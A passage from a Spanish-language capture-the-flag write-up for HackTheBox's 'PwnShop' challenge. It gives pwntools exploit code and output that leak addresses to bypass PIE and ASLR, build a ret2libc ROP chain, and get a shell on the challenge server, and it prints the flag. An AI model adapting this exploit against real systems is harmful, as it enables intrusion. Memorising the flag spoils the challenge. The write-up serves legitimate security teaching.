<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Enter details: '</span><span class="mtk1">, </span><span class="mtk1">payload</span><span class="mtk1">)</span>  

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './pwnshop'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-green">+</span>] Starting local process './pwnshop': pid 1287589  
[<span class="code-blue">*</span>] Leaked details_global address: 0x56069695a0c0
[<span class="code-green">+</span>] ELF base address: 0x560696956000
[<span class="code-blue">*</span>] Switching to interactive mode
\xe0&lt;\xc7̛\x7f
Sorry, we aren't selling right now.
But you can place a request.
Enter details: <span class="code-red">$</span>
</code></pre></div><p>Y ahí está la fuga de memoria. Vamos a cogerlo para encontrar la dirección base de Glibc y así burlar ASLR:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ldd</span> <span class="mtku">pwnshop</span>
        linux-vdso.so.1 (0x00007ffe2cd77000)
        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f1fdc075000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f1fdc281000)

<span class="code-cyan">$</span> <span class="code-dark-green">readelf</span> -s <span class="mtku">/lib/x86_64-linux-gnu/libc.so.6</span> | <span class="code-dark-green">grep</span> setvbuf
   442: 0000000000084ce0   583 FUNC    GLOBAL DEFAULT   15 _IO_<span class="code-red">setvbuf</span>@@GLIBC_2.2.5  
  1988: 0000000000084ce0   583 FUNC    WEAK   DEFAULT   15 <span class="code-red">setvbuf</span>@@GLIBC_2.2.5
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">setvbuf_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> u64(</span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvline</span><span class="mtk1">().</span><span class="mtk8">strip</span><span class="mtk1">().</span><span class="mtk8">ljust</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">))</span>
<span class="mtk1">    </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">info</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Leaked setvbuf() address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">setvbuf_addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>  

<span class="mtk1">    </span><span class="mtk1">setvbuf_offset</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">84ce0</span>

<span class="mtk1">    </span><span class="mtk1">glibc_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">setvbuf_addr</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk1">setvbuf_offset</span>
<span class="mtk1">    </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Glibc base address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">glibc_addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>


<span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">__name__</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'__main__'</span><span class="mtk1">:</span>
<span class="mtk1">    </span><span class="mtk8">main</span><span class="mtk1">()</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './pwnshop'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-green">+</span>] Starting local process './pwnshop': pid 1288432  
[<span class="code-blue">*</span>] Leaked details_global address: 0x561736fb40c0
[<span class="code-green">+</span>] ELF base address: 0x561736fb0000
[<span class="code-blue">*</span>] Leaked setvbuf() address: 0x7f934a07bce0
[<span class="code-green">+</span>] Glibc base address: 0x7f9349ff7000
[<span class="code-blue">*</span>] Switching to interactive mode
Sorry, we aren't selling right now.
But you can place a request.
Enter details: <span class="code-red">$</span>
</code></pre></div><p>Ya está. De nuevo, podemos ver que la dirección base termina en <code>000</code> en hexadecimal.</p><p>Vamos a coger todos los <em>offsets</em> necesaios para continuar con un ataque Ret2Libc (nótese que estamos resolviendo el reto en local):</p><ul><li><em>Offset</em> de <code>system</code> (<code>0x52290</code>):</li></ul><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">readelf</span> -s <span class="mtku">/lib/x86_64-linux-gnu/libc.so.6</span> | <span class="code-dark-green">grep</span> system
   237: 0000000000153ae0   103 FUNC    GLOBAL DEFAULT   15 svcerr_<span class="code-red">system</span>err@@GLIBC_2.2.5  
   619: 0000000000052290    45 FUNC    GLOBAL DEFAULT   15 __libc_<span class="code-red">system</span>@@GLIBC_PRIVATE
  1430: 0000000000052290    45 FUNC    WEAK   DEFAULT   15 <span class="code-red">system</span>@@GLIBC_2.2.5
</code></pre></div><ul><li><em>Offset</em> de <code>"/bin/sh"</code> (<code>0x1b45bd</code>):</li></ul><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">strings</span> -atx <span class="mtku">/lib/x86_64-linux-gnu/libc.so.6</span> | <span class="code-dark-green">grep</span> /bin/sh  
 1b45bd <span class="code-red">/bin/sh</span>
</code></pre></div><h3 id="obteniendo-rce">Obteniendo RCE</h3><p>Luego, calculamos las direcciones reales de <code>system</code> y <code>"/bin/sh"</code> en tiempo de ejecución y terminamos el <em>exploit</em>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">setvbuf_offset</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">84ce0</span>
<span class="mtk1">    </span><span class="mtk1">system_offset</span><span class="mtk1">  </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">52290</span>
<span class="mtk1">    </span><span class="mtk1">bin_sh_offset</span><span class="mtk1">  </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">1b45bd</span>

<span class="mtk1">    </span><span class="mtk1">glibc_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">setvbuf_addr</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk1">setvbuf_offset</span>
<span class="mtk1">    </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Glibc base address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">glibc_addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>  

<span class="mtk1">    </span><span class="mtk1">system_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">glibc_addr</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk1">system_offset</span>
<span class="mtk1">    </span><span class="mtk1">bin_sh_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">glibc_addr</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk1">bin_sh_offset</span>

<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1">  </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">5</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">pop_rdi_ret</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">bin_sh_addr</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">pop_rdi_ret</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">system_addr</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">sub_rsp_0x28_ret</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Enter details: '</span><span class="mtk1">, </span><span class="mtk1">payload</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
</code></pre></div><p>Nótese el uso de <code>pop_rdi_ret + 1</code> como <em>gadget</em> <code>ret</code> para prevenir el problema del alineamiento de la pila (<em>stack alignment</em>) antes de llamar a <code>system</code>. Ahora el <em>exploit</em> funciona en local:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './pwnshop'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-green">+</span>] Starting local process './pwnshop': pid 1299852  
[<span class="code-blue">*</span>] Leaked details_global address: 0x55b12e8b30c0
[<span class="code-green">+</span>] ELF base address: 0x55b12e8af000
[<span class="code-blue">*</span>] Leaked setvbuf() address: 0x7f03d716ace0
[<span class="code-green">+</span>] Glibc base address: 0x7f03d70e6000
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> ls
pwnshop  solve.py
</code></pre></div><p>Vamos a probar en remoto:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 134.122.111.164:30819
[<span class="code-blue">*</span>] './pwnshop'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-green">+</span>] Opening connection to 134.122.111.164 on port 30819: Done  
[<span class="code-blue">*</span>] Leaked details_global address: 0x5569018770c0
[<span class="code-green">+</span>] ELF base address: 0x556901873000
[<span class="code-blue">*</span>] Leaked setvbuf() address: 0x7f270d5cae80
[<span class="code-green">+</span>] Glibc base address: 0x7f270d5461a0
[<span class="code-blue">*</span>] Switching to interactive mode
[<span class="code-blue">*</span>] Got EOF while reading in interactive
<span class="code-red">$</span>
</code></pre></div><p>No conseguimos una <em>shell</em> porque la instancia remota tiene una versión de Glibc diferente. Una manera de conseguirla es buscar por los últimos tres dígitos en hexadecimal de una fuga de memoria (es decir, <code>setvbuf</code>) en una página como <a href="https://libc.rip">libc.rip</a>. Vemos algunas versiones de Glibc que se ajustan a la búsqueda y los <em>offsets</em> más útiles:</p><p><img src="/images/HTB-Challenges/HTB-Pwn-PwnShop-1.png" alt="Glibc search"></p><p>Afortunadamente, la versión que coincide con la que tiene la instancia remota es la primera.</p><h2 id="_flag_"><em>Flag</em></h2><p>Después de cambiar los valores de los <em>offsets</em> en el <em>exploit</em> podremos conseguir una <em>shell</em> finalmente:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 134.122.111.164:30819
[<span class="code-blue">*</span>] './pwnshop'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-green">+</span>] Opening connection to 134.122.111.164 on port 30819: Done  
[<span class="code-blue">*</span>] Leaked details_global address: 0x563c175640c0
[<span class="code-green">+</span>] ELF base address: 0x563c17560000
[<span class="code-blue">*</span>] Leaked strcmp() address: 0x7fdd05ae3e80
[<span class="code-green">+</span>] Glibc base address: 0x7fdd05a74000
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> ls
core
flag.txt
pwnshop
<span class="code-red">$</span> cat flag.txt
HTB{th1s_is_wh@t_I_c@ll_a_g00d_d3a1!}
</code></pre></div><p>El <em>exploit</em> completo se puede encontrar aquí: <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Challenges/Pwn/PwnShop/solve.py"><code>solve.py</code></a>.</p><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#ingeniería-inversa">Ingeniería inversa</a><ul><li><a href="#vulnerabilidad-de-_buffer-overflow_">Vulnerabilidad de <em>Buffer Overflow</em></a></li></ul></li><li><a href="#estrategia-de-explotación">Estrategia de explotación</a></li><li><a href="#desarrollo-del-_exploit_">Desarrollo del <em>exploit</em></a><ul><li><a href="#_bypass_-de-pie"><em>Bypass</em> de PIE</a></li><li><a href="#diseñando-la-rop-_chain_">Diseñando la ROP <em>chain</em></a></li><li><a href="#fugando-direcciones-de-memoria">Fugando direcciones de memoria</a></li><li><a href="#obteniendo-rce">Obteniendo RCE</a></li></ul></li><li><a href="#_flag_"><em>Flag</em></a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://tinyletter.com/7Rocky" method="post" target="popupwindow" onsubmit='return window.open("https://tinyletter.com/7Rocky","popupwindow","scrollbars=yes,width=800,height=600"),!0'><h3 class="tc">Recibe un resumen semanal del blog</h3><p class="tc"><label for="tlemail"></label></p><p class="tc"><input type="text" class="w-80 f5 pv3 ph3 bg-light-gray bn search" placeholder="Introduce tu correo electrónico" name="email" id="tlemail"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Suscribirse"><p class="tc">impulsado por <a href="https://tinyletter.com" target="_blank" title="tiniletter">TinyLetter</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; Blog de 7Rocky. Ciberseguridad y Mates 2023</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>